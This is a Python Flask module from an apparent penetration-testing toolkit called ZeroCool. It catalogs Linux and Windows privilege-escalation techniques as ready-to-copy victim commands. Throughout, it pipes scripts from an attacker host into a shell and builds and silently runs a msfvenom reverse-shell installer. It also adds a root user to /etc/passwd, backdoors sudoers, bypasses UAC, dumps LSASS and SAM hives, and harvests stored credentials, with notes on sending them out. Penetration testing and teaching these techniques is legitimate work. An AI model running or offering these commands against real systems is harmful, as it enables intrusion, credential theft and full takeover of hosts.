"""Privilege escalation module for ZeroCool.

A catalog of Linux and Windows privesc techniques. Each item carries:

  * target[]  — commands to run ON the victim (shown with copy buttons),
  * stage     — an optional command run IN ZeroCool (logged) that drops a tool
                into the loot dir so the File Transfer server can serve it,
  * notes     — short guidance / CVE refs.

Commands are templated with engagement-derived values, substituted client-side
so one IP/port/loot/LPORT bar updates every snippet:
  {ip}    attacker IP            {port}  file-server port
  {lport} reverse-shell port     {loot}  loot/output dir
  {tip}   target IP

Run a quick scan, catch a shell (Reverse Shells), serve tools (File Transfer),
then work this list. Pairs with the LinPEAS/WinPEAS/PowerUp fetchers on the
Dependencies page.
"""

from __future__ import annotations

from flask import Blueprint, render_template

import storage

privesc_bp = Blueprint("privesc", __name__)

# Canonical release URLs used by the "stage" actions.
LINPEAS = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
WINPEAS = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
PSPY = "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"
LSE = "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh"
LES = "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh"
POWERUP = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
PRINTSPOOFER = "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe"
GODPOTATO = "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe"


def _stage(url, name):
    return f"mkdir -p {{loot}} && curl -sL {url} -o {{loot}}/{name} && echo staged {{loot}}/{name}"


LINUX = [
    {"cat": "Enumeration", "items": [
        {"label": "Quick wins (manual)", "desc": "First things to check by hand.",
         "target": ["id; sudo -l 2>/dev/null; uname -a; cat /etc/os-release; hostname; ip a"]},
        {"label": "LinPEAS", "desc": "The all-in-one Linux enumerator.",
         "stage": _stage(LINPEAS, "linpeas.sh"),
         "target": ["curl -s http://{ip}:{port}/linpeas.sh | sh",
                    "wget -qO- http://{ip}:{port}/linpeas.sh | sh"],
         "notes": ["Stage it, serve {loot} from File Transfer, then run on target."]},
        {"label": "linux-smart-enumeration (lse)", "desc": "Quieter, level-based enum.",
         "stage": _stage(LSE, "lse.sh"),
         "target": ["curl -s http://{ip}:{port}/lse.sh | bash -s -- -l1"]},
        {"label": "pspy (watch cron/processes)", "desc": "See processes & cron without root.",
         "stage": _stage(PSPY, "pspy64"),
         "target": ["curl -s http://{ip}:{port}/pspy64 -o /tmp/pspy; chmod +x /tmp/pspy; /tmp/pspy"]},
    ]},
    {"cat": "SUID / SGID / Capabilities", "items": [
        {"label": "SUID binaries", "desc": "Cross-check hits against GTFOBins.",
         "target": ["find / -perm -4000 -type f 2>/dev/null"]},
        {"label": "SGID binaries", "desc": "",
         "target": ["find / -perm -2000 -type f 2>/dev/null"]},
        {"label": "File capabilities", "desc": "cap_setuid=ep etc. are gold.",
         "target": ["/usr/sbin/getcap -r / 2>/dev/null"]},
    ]},
    {"cat": "Sudo", "items": [
        {"label": "Sudo rights", "desc": "Map each allowed binary to GTFOBins.",
         "target": ["sudo -l"]},
        {"label": "Baron Samedit (CVE-2021-3156)", "desc": "Heap overflow in sudo < 1.9.5p2.",
         "target": ["sudo --version | head -1", "sudoedit -s '\\' $(python3 -c 'print(\"A\"*200)')"],
         "notes": ["A crash from the 2nd command suggests vulnerable. Exploit: blasty-vs-sudo / CVE-2021-3156."]},
        {"label": "PwnKit (CVE-2021-4034)", "desc": "polkit pkexec local root, near-universal.",
         "target": ["pkexec --version",
                    "curl -s http://{ip}:{port}/PwnKit -o /tmp/pk; chmod +x /tmp/pk; /tmp/pk"],
         "notes": ["Stage a compiled PwnKit (ly4k/PwnKit) into {loot} as 'PwnKit' to use the 2nd line."]},
    ]},
    {"cat": "Kernel exploits", "items": [
        {"label": "Kernel / distro version", "desc": "",
         "target": ["uname -a; cat /proc/version; cat /etc/os-release"]},
        {"label": "linux-exploit-suggester", "desc": "Maps the kernel to known exploits.",
         "stage": _stage(LES, "les.sh"),
         "target": ["curl -s http://{ip}:{port}/les.sh | bash"]},
        {"label": "DirtyPipe (CVE-2022-0847)", "desc": "Arbitrary file overwrite, kernel 5.8–5.16.11.",
         "target": ["uname -r"],
         "notes": ["If kernel in range: AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits."]},
    ]},
    {"cat": "Cron / timers", "items": [
        {"label": "Cron jobs & timers", "desc": "Look for writable scripts or wildcards.",
         "target": ["cat /etc/crontab; ls -la /etc/cron* /var/spool/cron 2>/dev/null; systemctl list-timers --all"]},
    ]},
    {"cat": "Writable / PATH / NFS", "items": [
        {"label": "World-writable files & dirs", "desc": "",
         "target": ["find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)'",
                    "find / -perm -222 -type d 2>/dev/null"]},
        {"label": "NFS no_root_squash", "desc": "Mount, drop a SUID root binary.",
         "target": ["cat /etc/exports 2>/dev/null", "showmount -e {tip}"]},
    ]},
    {"cat": "Groups / containers", "items": [
        {"label": "Dangerous group membership", "desc": "docker / lxd / disk / adm.",
         "target": ["id"]},
        {"label": "docker group → root", "desc": "Mount host fs in a container.",
         "target": ["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"]},
        {"label": "disk group → read raw fs", "desc": "",
         "target": ["df -h", "debugfs /dev/sda1"]},
    ]},
    {"cat": "Writable system files", "items": [
        {"label": "Writable /etc/passwd", "desc": "Add your own root user.",
         "target": ["ls -l /etc/passwd",
                    "openssl passwd -1 -salt zc pass123",
                    "echo 'zc:$1$zc$<hash>:0:0::/root:/bin/bash' >> /etc/passwd; su zc"],
         "notes": ["Paste the hash from openssl into the passwd line; su zc (password pass123)."]},
        {"label": "Writable /etc/shadow", "desc": "Overwrite root's hash.",
         "target": ["ls -l /etc/shadow", "openssl passwd -6 pass123"],
         "notes": ["Replace root's hash field with the generated one, then su root."]},
        {"label": "Writable sudoers", "desc": "Grant yourself NOPASSWD ALL.",
         "target": ["ls -l /etc/sudoers /etc/sudoers.d/ 2>/dev/null",
                    "echo '<user> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/zc"]},
    ]},
    {"cat": "Sudo abuse", "items": [
        {"label": "LD_PRELOAD / env_keep", "desc": "When sudo -l shows env_keep+=LD_PRELOAD.",
         "target": ["sudo -l | grep -i ld_preload",
                    "echo 'void _init(){setgid(0);setuid(0);system(\"/bin/sh\");}' > /tmp/x.c; gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c",
                    "sudo LD_PRELOAD=/tmp/x.so <any-allowed-binary>"]},
        {"label": "sudoedit -e (CVE-2023-22809)", "desc": "Edit arbitrary files via EDITOR.",
         "target": ["sudo --version | head -1",
                    "EDITOR='vim -- /etc/passwd' sudoedit /etc/<allowed-file>"],
         "notes": ["sudo 1.8.0–1.9.12p1 when you hold a sudoedit rule."]},
        {"label": "GTFOBins (allowed binary)", "desc": "Map each NOPASSWD binary to GTFOBins.",
         "target": ["sudo -l"],
         "notes": ["e.g. sudo find . -exec /bin/sh \\; · sudo vim -c ':!/bin/sh' · sudo less /etc/profile then !sh"]},
    ]},
    {"cat": "Capabilities abuse", "items": [
        {"label": "cap_setuid on interpreter", "desc": "python/perl with cap_setuid=ep → root.",
         "target": ["/usr/sbin/getcap -r / 2>/dev/null",
                    "python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
                    "perl -e 'use POSIX qw(setuid);POSIX::setuid(0);exec \"/bin/sh\";'"]},
        {"label": "cap_dac_read_search", "desc": "Read any file (e.g. /etc/shadow) with the capable binary.",
         "target": ["/usr/sbin/getcap -r / 2>/dev/null"]},
    ]},
    {"cat": "Credentials & secrets", "items": [
        {"label": "SSH keys & authorized_keys", "desc": "",
         "target": ["find / \\( -name id_rsa -o -name id_ed25519 -o -name authorized_keys \\) 2>/dev/null"]},
        {"label": "Secrets in files & history", "desc": "",
         "target": ["cat ~/.bash_history ~/.*_history 2>/dev/null",
                    "grep -rinE 'password|passwd|secret|token|api[_-]?key' /etc /var/www /opt /home 2>/dev/null | head -40",
                    "cat ~/.netrc ~/.git-credentials 2>/dev/null"]},
        {"label": "App / database config creds", "desc": "",
         "target": ["find / \\( -name 'config*.php' -o -name '.env' -o -name 'wp-config.php' \\) 2>/dev/null",
                    "cat /var/www/html/wp-config.php 2>/dev/null"]},
    ]},
    {"cat": "Containers & escapes", "items": [
        {"label": "Writable docker socket", "desc": "Root via the Docker API.",
         "target": ["ls -l /var/run/docker.sock",
                    "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"]},
        {"label": "lxd / lxc group", "desc": "Mount host fs in a privileged container.",
         "target": ["id | grep -i lxd"],
         "notes": ["Import an alpine image, launch with security.privileged=true, add a disk device for /, then chroot. See HackTricks lxd."]},
        {"label": "Kubernetes service-account token", "desc": "Inside a pod — hit the API.",
         "target": ["cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
                    "env | grep -i kube; ls -la /var/run/secrets/kubernetes.io 2>/dev/null"]},
        {"label": "Container breakout surface", "desc": "Privileged / host mounts / dangerous caps.",
         "target": ["cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null; capsh --print 2>/dev/null"],
         "notes": ["Privileged container, host PID/net, writable /proc, CVE-2019-5736 (runc)."]},
    ]},
    {"cat": "Services & systemd", "items": [
        {"label": "Writable systemd units / timers", "desc": "Edit a root-run unit's ExecStart.",
         "target": ["find /etc/systemd /lib/systemd /run/systemd -name '*.service' -writable 2>/dev/null",
                    "systemctl list-timers --all"]},
        {"label": "Relative path in root service", "desc": "Hijack a binary called without a full path.",
         "target": ["grep -rl 'ExecStart' /etc/systemd/system 2>/dev/null"]},
    ]},
    {"cat": "PATH & library hijacking", "items": [
        {"label": "PATH hijack (root cron/SUID script)", "desc": "If a privileged script calls a binary by name.",
         "target": ["echo $PATH",
                    "cd /tmp; echo '/bin/bash -p' > <binary-name>; chmod +x <binary-name>; export PATH=/tmp:$PATH"]},
        {"label": "Writable Python module path", "desc": "Hijack a module imported by a root script.",
         "target": ["python3 -c 'import sys;print(sys.path)'",
                    "find / -name '*.py' -writable 2>/dev/null | grep -i site-packages"]},
    ]},
]

WINDOWS = [
    {"cat": "Enumeration", "items": [
        {"label": "Quick wins (manual)", "desc": "Privileges, host info, users.",
         "target": ["whoami /all & systeminfo & net user & net localgroup administrators"]},
        {"label": "WinPEAS", "desc": "The all-in-one Windows enumerator.",
         "stage": _stage(WINPEAS, "winPEASx64.exe"),
         "target": ["curl http://{ip}:{port}/winPEASx64.exe -o %TEMP%\\wp.exe & %TEMP%\\wp.exe",
                    "powershell -c \"IWR http://{ip}:{port}/winPEASx64.exe -OutFile $env:TEMP\\wp.exe; & $env:TEMP\\wp.exe\""]},
        {"label": "PowerUp (Invoke-AllChecks)", "desc": "PowerShell privesc checks.",
         "stage": _stage(POWERUP, "PowerUp.ps1"),
         "target": ["powershell -ep bypass -c \"IEX(IWR http://{ip}:{port}/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks\""]},
    ]},
    {"cat": "Token privileges (Potato)", "items": [
        {"label": "Check privileges", "desc": "SeImpersonate / SeAssignPrimaryToken → Potato.",
         "target": ["whoami /priv"]},
        {"label": "PrintSpoofer", "desc": "SeImpersonate → SYSTEM (Win10/2019).",
         "stage": _stage(PRINTSPOOFER, "PrintSpoofer64.exe"),
         "target": ["curl http://{ip}:{port}/PrintSpoofer64.exe -o %TEMP%\\ps.exe & %TEMP%\\ps.exe -i -c cmd"]},
        {"label": "GodPotato", "desc": "SeImpersonate → SYSTEM (broad .NET coverage).",
         "stage": _stage(GODPOTATO, "GodPotato.exe"),
         "target": ["%TEMP%\\GodPotato.exe -cmd \"cmd /c whoami\""],
         "notes": ["JuicyPotato for older builds (< Win10 1809 / Server 2019)."]},
    ]},
    {"cat": "Services", "items": [
        {"label": "Unquoted service paths", "desc": "Plant a binary in a space-containing path.",
         "target": ["wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\""]},
        {"label": "Weak service permissions", "desc": "accesschk for writable services.",
         "target": ["accesschk.exe /accepteula -uwcqv \"Everyone\" *",
                    "sc qc <service>", "sc config <service> binpath= \"C:\\path\\evil.exe\""]},
    ]},
    {"cat": "AlwaysInstallElevated", "items": [
        {"label": "Check both keys", "desc": "Both must be 1 to abuse.",
         "target": ["reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                    "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"]},
        {"label": "Build & run malicious MSI", "desc": "Stage builds it into loot; run on target.",
         "stage": "mkdir -p {loot} && msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={lport} -f msi -o {loot}/evil.msi && echo built {loot}/evil.msi",
         "target": ["curl http://{ip}:{port}/evil.msi -o %TEMP%\\e.msi & msiexec /quiet /qn /i %TEMP%\\e.msi"]},
    ]},
    {"cat": "Stored credentials", "items": [
        {"label": "Saved creds & runas", "desc": "",
         "target": ["cmdkey /list", "runas /savecred /user:administrator cmd"]},
        {"label": "GPP / registry passwords", "desc": "cpassword in SYSVOL, autologon.",
         "target": ["findstr /S /I cpassword \\\\%USERDNSDOMAIN%\\SYSVOL\\*.xml",
                    "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword",
                    "reg query HKLM /f password /t REG_SZ /s"]},
    ]},
    {"cat": "Scheduled tasks / autoruns", "items": [
        {"label": "Scheduled tasks", "desc": "Look for writable task binaries.",
         "target": ["schtasks /query /fo LIST /v"]},
        {"label": "Autorun weak perms", "desc": "Check autoruns then accesschk the binary.",
         "target": ["reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "accesschk.exe /accepteula -wvu \"C:\\path\\autorun.exe\""]},
    ]},
    {"cat": "Token privileges — more", "items": [
        {"label": "SeBackupPrivilege → SAM/SYSTEM", "desc": "Backup right reads protected files.",
         "target": ["whoami /priv | findstr /i backup",
                    "reg save HKLM\\SAM %TEMP%\\sam.hive & reg save HKLM\\SYSTEM %TEMP%\\system.hive"],
         "notes": ["Exfil the hives, then: impacket-secretsdump -sam sam.hive -system system.hive LOCAL"]},
        {"label": "SeDebugPrivilege → dump LSASS", "desc": "Debug right → read LSASS memory.",
         "target": ["whoami /priv | findstr /i debug",
                    "tasklist /fi \"imagename eq lsass.exe\"",
                    "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <lsass-pid> %TEMP%\\lsass.dmp full"],
         "notes": ["Parse with: pypykatz lsa minidump lsass.dmp"]},
        {"label": "SeRestore / SeTakeOwnership", "desc": "Write/own protected files → replace a service exe or utilman.exe.",
         "target": ["whoami /priv | findstr /i \"Restore TakeOwnership\""],
         "notes": ["Take ownership of a SYSTEM-run binary (service exe, sethc.exe/utilman.exe) and overwrite it."]},
        {"label": "SeManageVolumePrivilege", "desc": "→ arbitrary write into System32 → DLL hijack.",
         "target": ["whoami /priv | findstr /i ManageVolume"],
         "notes": ["SeManageVolumeExploit → drop a DLL (e.g. tzres.dll) into System32."]},
        {"label": "SeLoadDriverPrivilege", "desc": "Load a vulnerable driver (Capcom) → SYSTEM.",
         "target": ["whoami /priv | findstr /i LoadDriver"]},
    ]},
    {"cat": "DLL & service hijacking", "items": [
        {"label": "Modifiable service binary", "desc": "Overwrite the service exe if writable.",
         "target": ["accesschk.exe /accepteula -quvw <service>", "sc qc <service>"]},
        {"label": "Missing-DLL hijack", "desc": "Drop a DLL a service loads from a writable dir.",
         "target": ["accesschk.exe /accepteula -dqv \"C:\\Path\\To\\ServiceDir\""],
         "notes": ["Procmon → NAME NOT FOUND on a .dll reveals a hijackable load."]},
        {"label": "Writable PATH directory", "desc": "Plant a DLL/binary in a writable %PATH% entry.",
         "target": ["echo %PATH%"]},
    ]},
    {"cat": "Credential hunting", "items": [
        {"label": "LSASS dump (comsvcs)", "desc": "Built-in MiniDump, parse offline.",
         "target": ["tasklist /fi \"imagename eq lsass.exe\"",
                    "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <lsass-pid> %TEMP%\\lsass.dmp full"],
         "notes": ["pypykatz lsa minidump lsass.dmp  /  mimikatz sekurlsa::minidump"]},
        {"label": "SAM / SYSTEM / SECURITY hives", "desc": "",
         "target": ["reg save HKLM\\SAM %TEMP%\\sam & reg save HKLM\\SYSTEM %TEMP%\\sys & reg save HKLM\\SECURITY %TEMP%\\sec"]},
        {"label": "Unattended / sysprep files", "desc": "Often hold a base64 admin password.",
         "target": ["dir /b /s C:\\unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\System32\\sysprep\\* 2>nul"]},
        {"label": "PowerShell history", "desc": "",
         "target": ["type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"]},
        {"label": "Saved Wi-Fi passwords", "desc": "",
         "target": ["netsh wlan show profiles", "netsh wlan show profile name=\"<SSID>\" key=clear"]},
        {"label": "Saved app creds (Putty/WinSCP/VNC)", "desc": "",
         "target": ["cmdkey /list",
                    "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s",
                    "reg query \"HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\" /s"]},
        {"label": "IIS web.config / app pool", "desc": "",
         "target": ["%systemroot%\\system32\\inetsrv\\appcmd.exe list apppool /text:* 2>nul",
                    "dir /s /b C:\\inetpub\\wwwroot\\web.config 2>nul"]},
    ]},
    {"cat": "UAC bypass", "items": [
        {"label": "fodhelper (auto-elevate)", "desc": "Admin user, medium → high integrity.",
         "target": ["whoami /groups | findstr /i \"High Mandatory\"",
                    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"cmd.exe\" /f & reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f & fodhelper.exe"],
         "notes": ["Clean up the keys after. Other triggers: computerdefaults.exe, eventvwr.exe, sdclt.exe."]},
    ]},
    {"cat": "Known exploits", "items": [
        {"label": "HiveNightmare / SeriousSAM (CVE-2021-36934)", "desc": "Readable SAM via shadow copies.",
         "target": ["icacls C:\\Windows\\System32\\config\\SAM", "vssadmin list shadows"],
         "notes": ["If SAM is BUILTIN\\Users:(R), read SAM/SYSTEM from a VSS snapshot."]},
        {"label": "PrintNightmare (CVE-2021-34527)", "desc": "Spooler RCE / LPE.",
         "target": ["reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\""]},
        {"label": "Windows Exploit Suggester (wesng)", "desc": "Map systeminfo to missing patches.",
         "target": ["systeminfo > %TEMP%\\systeminfo.txt"],
         "notes": ["Exfil systeminfo.txt, then on Kali: wes.py --update; wes.py systeminfo.txt"]},
    ]},
]

CATALOG = {"linux": LINUX, "windows": WINDOWS}


@privesc_bp.route("/privesc")
def privesc():
    eng = storage.load_engagement()
    return render_template("privesc.html", eng=eng, catalog=CATALOG)
